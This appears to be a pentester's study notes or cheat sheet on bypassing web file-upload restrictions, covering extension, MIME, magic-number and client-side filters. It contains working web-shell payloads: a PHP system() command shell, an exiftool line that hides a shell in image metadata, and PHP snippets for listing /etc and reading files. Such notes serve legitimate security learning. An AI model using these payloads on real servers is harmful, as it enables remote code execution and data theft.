
* Upload file with **double extension**(ex: file.png.php or file.png.php5).
1. PHP extensions: php,php2,php3,php4,php5,php6,php7,phps,pht,phtml,pgif,shtml,htaccess,phar,inc.
2. ASP extensions: asp,aspx,config,ashx,asmx,aspq,axd,cshtm,cshtml,rem,soap,vbhtml,asa,cer,shtml

* Try to **upper case some letter** of extension ex: pHp,pHP5,PhAr
* **Double or more extension**: 1. file.png.php 2.file.png.txt.php
* **reverse double extension**(useful to exploit apache misconfig where anything with extension .php but not necessarily ending in .php will execute code) ex: file.php.png
* **Double extenson ending with nullcharacter** ex: file.php%00.png
* **add several special characters at the end of the extension** ex: %00,%20,...
1. file.php%00
2. file.php%20
3. file.php....( in windows dots are removed)
4. file.php/
5. file.php\
* **Bypass Content-Type** checks by setting **value** of the **Content-Type header** to : image/png,text/plain,application/octet-stream
* **Bypass magic number** check by adding at the begnning of the file the **bytes of a real image** (confuse the file command) or introduce the shell inside the **metadata**.
`exiftool --comment="<?php echo 'Command:'; if($POST){system($POST['cmd']);} __halt_compiler();" img.jpg`

# Simple php RCE code
```
<?php
    echo system($_GET["cmd"]);
?>
```


# Filtering 
There are two way to filter 
1. Client Side
2. Server Side

## Client Side 
This is done by javascript 
**Bypass:** Just remove the javascript or diable it also 


## Server Side
 Traditionally PHP was the predominant server-side language also in recent years (C#, Node.js, Python, Ruby on Rails, and a variety of others) are more widely used.
 
 
 
 ## Different kind of filtering 
 
1. Extension validation
2. File Type Filtering
3. File Length Filtering
4. File Name Filtering
5. File Content Filtering

It's worth noting that none of these filters are perfect by themselves -- they will usually be used in conjunction with each other, providing a multi-layered filter, thus increasing the security of the upload significantly. Any of these filters can all be applied client-side, server-side, or both.

**Extension Validation:**
File extensions are used (in theory) to identify the contents of a file. In practice they are very easy to change, so actually don't mean much; however, MS Windows still uses them to identify file types, although Unix based systems tend to rely on other methods, which we'll cover in a bit. Filters that check for extensions work in one of two ways. They either blacklist extensions (i.e. have a list of extensions which are not allowed) or they whitelist extensions (i.e. have a list of extensions which are allowed, and reject everything else).

**File Type Filtering**
Similar to Extension validation, but more intensive, file type filtering looks, once again, to verify that the contents of a file are acceptable to upload. We'll be looking at two types of file type validation:
* MIME validation: MIME (Multipurpose Internet Mail Extension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request, and looks something like this:

![](https://i.imgur.com/uptWRKW.png)

* Magic Number Validation: Basically magic number are the magic bits from which file is determined that what type of file it is `file abc.png` this shell command will show you the hex of the file and in which you will see:

![](https://i.imgur.com/vHQWOgi.png)

_The first **8values** shows the magic bytes _

**File Length Filtering:**
File length filters are used to prevent huge files from being uploaded to the server via an upload form (as this can potentially starve the server of resources). In most cases this will not cause us any issues when we upload shells; however, it's worth bearing in mind that if an upload form only expects a very small file to be uploaded, there may be a length filter in place to ensure that the file length requirement is adhered to. As an example, our fully fledged PHP reverse shell from the previous task is 5.4Kb big -- relatively tiny, but if the form expects a maximum of 2Kb then we would need to find an alternative shell to upload.

**File Name Filtering:**

As touched upon previously, files uploaded to a server should be unique. Usually this would mean adding a random aspect to the file name, however, an alternative strategy would be to check if a file with the same name already exists on the server, and give the user an error if so. Additionally, file names should be sanitised on upload to ensure that they don't contain any "bad characters", which could potentially cause problems on the file system when uploaded (e.g. null bytes or forward slashes on Linux, as well as control characters such as `;` and potentially unicode characters). What this means for us is that, on a well administered system, our uploaded files are unlikely to have the same name we gave them before uploading, so be aware that you may have to go hunting for your shell in the event that you manage to bypass the content filtering.

**File Content Filtering:**
More complicated filtering systems may scan the full contents of an uploaded file to ensure that it's not spoofing its extension, MIME type and Magic Number. 

_**These filters are used as a chain or multi-layered filter **_

Similarly, different frameworks and languages come with their own inherent methods of filtering and validating uploaded files. As a result, it is possible for language specific exploits to appear; for example, until PHP major version five, it was possible to bypass an extension filter by appending a null byte, followed by a valid extension, to the malicious .php file. More recently it was also possible to inject PHP code into the exif data of an otherwise valid image file, then force the server to execute it. These are things that you are welcome to research further, should you be interested.


## Client Side Bypass

This is easy to bypass because this persist in the client browser which user can allow or change 
The various methods used to bypass client side filtering.
1. **Turn off the Javascript in browser:** This will work as site doesnt need javascript to provide basic functionalities.
2. **Intercept and modify the incoming page:** Using Burp, we can intercept the incoming web page and strip out the js filters before it has a chance to run.
3. **Intercept and modify the file upload:** Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter).
4. **Send the file directly to the upload point:** Why use the webpage with the filter, when you can send the file directly using a tool like curl? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter `curl -X POST -F "submit:<value> -F "<file-parameter>:@"`



# File upload and read content of system without SYSTEM call

so in this we arent gonna use system($\_GET['x3rz'])  to go with the parameter so in this we will be using general function provided by php i.e : ==scandir(), file_get_contents()==

#### for scandir :
```
//specifying directory 
$mydir = '/etc/'; 
//scanning files in a given diretory in ascending order 
$myfiles = scandir(\$mydir);
//displaying the files in the directory 
print_r($myfiles); 
```
So here you can see the scandir func working on /etc directory and will print result in ascending order.

#### For reading files
```
$text = file_get_contents('/etc/f1@g.txt'); 
echo $text; 
```
here just specifying the directory to read the flag.

# [Mitigation](https://www.developerdrive.com/common-php-file-upload-restrictions/)
[hacktricks](https://book.hacktricks.xyz/pentesting-web/file-upload)
[OWASP](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#content-type-validation)